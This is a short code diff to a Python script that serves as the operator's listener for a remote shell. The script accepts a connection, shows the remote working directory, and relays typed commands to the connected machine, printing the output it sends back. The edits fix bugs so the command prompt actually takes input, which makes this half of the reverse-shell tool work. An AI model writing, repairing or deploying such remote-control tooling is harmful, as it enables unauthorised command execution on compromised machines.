@@ -10,7 +10,7 @@ s = socket.socket()
 s.bind((hostIP, hostPORT))
 
 s.listen(5)
-print(f"Listening on {hostIP}/{hostPORT}")
+print(f"Listening on {hostIP}:{hostPORT}")
 
 clientSocket, clientAddress = s.accept()
 print(f"{clientAddress[0]}:{clientAddress[1]} Connected")
@@ -19,7 +19,8 @@ cwd = clientSocket.recv(hostBuffer).decode()
 print("[$] Current working diresctory: ", cwd)
 
 while True:
-    command = print(f"{cwd} $>")
+    command = input(f"{cwd} $> ")
+
     if not command.strip():
         continue
 
@@ -32,4 +33,3 @@ while True:
     results, cwd = output.split(seperator)
 
     print(results)
-
